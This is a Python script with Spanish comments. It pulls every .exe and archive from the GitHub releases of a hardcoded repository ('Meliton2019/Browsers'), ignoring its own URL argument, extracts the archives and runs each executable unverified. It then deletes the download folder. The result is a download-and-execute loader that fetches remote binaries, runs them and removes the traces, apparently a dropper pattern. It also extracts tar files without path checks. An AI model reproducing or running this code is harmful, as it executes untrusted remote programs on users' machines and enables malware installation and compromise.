import os
import requests
import subprocess
import shutil
import zipfile
import tarfile
import gzip
from urllib.parse import urljoin

def descargar_y_ejecutar_exes_de_releases(repo_url, carpeta_destino="temp_exes"):
    """
    Descarga todos los archivos .exe de los releases de un repositorio de GitHub,
    los ejecuta y luego elimina la carpeta.
    
    Args:
        repo_url (str): URL del repositorio de GitHub
        carpeta_destino (str): Carpeta donde se guardarán los archivos
    """
    # Crear carpeta de destino si no existe
    if not os.path.exists(carpeta_destino):
        os.makedirs(carpeta_destino)
    
    # Extraer información del repositorio
    parts = repo_url.strip("/").split("/")
    if len(parts) < 2 or "github.com" not in parts:
        print("URL de repositorio inválida. Debe ser una URL de GitHub válida.")
        return
    
    owner = parts[-2]
    repo = parts[-1]
    
    # Obtener releases del repositorio
    api_url = f"https://api.github.com/repos/Meliton2019/Browsers/releases"
    
    try:
        # Obtener lista de releases
        response = requests.get(api_url)
        response.raise_for_status()
        releases = response.json()
        
        if not releases:
            print("No se encontraron releases en este repositorio.")
            return
        
        exe_files = []
        
        # Descargar archivos de cada release
        for release in releases:
            release_name = release.get("name", "Sin nombre")
            print(f"Procesando release: {release_name}")
            
            for asset in release.get("assets", []):
                asset_name = asset["name"]
                download_url = asset["browser_download_url"]
                
                # Descargar si es un .exe o un archivo comprimido
                if asset_name.endswith(".exe"):
                    file_path = os.path.join(carpeta_destino, asset_name)
                    print(f"Descargando {asset_name}...")
                    
                    file_response = requests.get(download_url)
                    file_response.raise_for_status()
                    
                    with open(file_path, "wb") as f:
                        f.write(file_response.content)
                    
                    exe_files.append(file_path)
                    print(f"Descargado: {file_path}")
                
                # Procesar archivos comprimidos que puedan contener .exe
                elif any(asset_name.endswith(ext) for ext in [".zip", ".tar", ".tar.gz", ".gz", ".7z", ".rar"]):
                    compressed_path = os.path.join(carpeta_destino, asset_name)
                    print(f"Descargando archivo comprimido {asset_name}...")
                    
                    file_response = requests.get(download_url)
                    file_response.raise_for_status()
                    
                    with open(compressed_path, "wb") as f:
                        f.write(file_response.content)
                    
                    # Extraer el archivo comprimido
                    extract_path = os.path.join(carpeta_destino, f"extracted_{asset_name}")
                    os.makedirs(extract_path, exist_ok=True)
                    
                    try:
                        if asset_name.endswith(".zip"):
                            with zipfile.ZipFile(compressed_path, 'r') as zip_ref:
                                zip_ref.extractall(extract_path)
                        elif asset_name.endswith(".tar") or asset_name.endswith(".tar.gz"):
                            with tarfile.open(compressed_path, 'r:*') as tar_ref:
                                tar_ref.extractall(extract_path)
                        elif asset_name.endswith(".gz"):
                            with gzip.open(compressed_path, 'rb') as gz_ref:
                                with open(os.path.join(extract_path, os.path.basename(asset_name)[:-3]), 'wb') as f:
                                    f.write(gz_ref.read())
                        
                        # Buscar archivos .exe en los extraídos
                        for root, _, files in os.walk(extract_path):
                            for file in files:
                                if file.endswith(".exe"):
                                    exe_path = os.path.join(root, file)
                                    exe_files.append(exe_path)
                                    print(f"Encontrado .exe extraído: {exe_path}")
                        
                        # Eliminar archivo comprimido después de extraer
                        os.remove(compressed_path)
                        
                    except Exception as e:
                        print(f"Error al extraer {asset_name}: {e}")
        
        # Ejecutar archivos .exe
        for exe_file in exe_files:
            try:
                print(f"Ejecutando {exe_file}...")
                subprocess.run([exe_file], check=True)
                print(f"Ejecutado correctamente: {exe_file}")
            except subprocess.CalledProcessError as e:
                print(f"Error al ejecutar {exe_file}: {e}")
            except Exception as e:
                print(f"Error inesperado al ejecutar {exe_file}: {e}")
        
        # Eliminar carpeta y su contenido
        try:
            print(f"Eliminando carpeta {carpeta_destino}...")
            shutil.rmtree(carpeta_destino)
            print(f"Carpeta eliminada correctamente")
        except Exception as e:
            print(f"Error al eliminar la carpeta: {e}")
            
    except Exception as e:
        print(f"Error: {e}")

# Ejemplo de uso
if __name__ == "__main__":
    repo_url = "https://github.com/Meliton2019/Browsers"  # Reemplaza con la URL del repositorio
    descargar_y_ejecutar_exes_de_releases(repo_url)